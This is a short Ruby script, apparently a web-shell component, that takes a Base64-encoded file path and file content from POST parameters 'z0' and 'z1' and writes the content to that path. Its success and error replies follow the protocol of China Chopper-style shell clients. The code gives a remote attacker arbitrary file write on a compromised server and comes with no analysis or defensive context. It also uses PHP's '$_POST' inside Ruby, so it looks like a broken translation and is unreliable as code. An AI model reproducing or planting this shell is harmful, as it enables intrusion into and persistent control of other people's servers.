require 'base64'

def main
  sz_file_path = Base64.decode64($_POST['z0'].to_s)
  sz_content   = Base64.decode64($_POST['z1'].to_s)

  begin
    File.open(sz_file_path, 'wb') do |file|
      file.write(sz_content)
    end
    
    print '1'

  rescue Errno::EACCES, Errno::ENOENT => e
    print 'ERROR://Unable to open file.'

  rescue => ex
    print "ERROR://#{ex.message}"
  end
end

main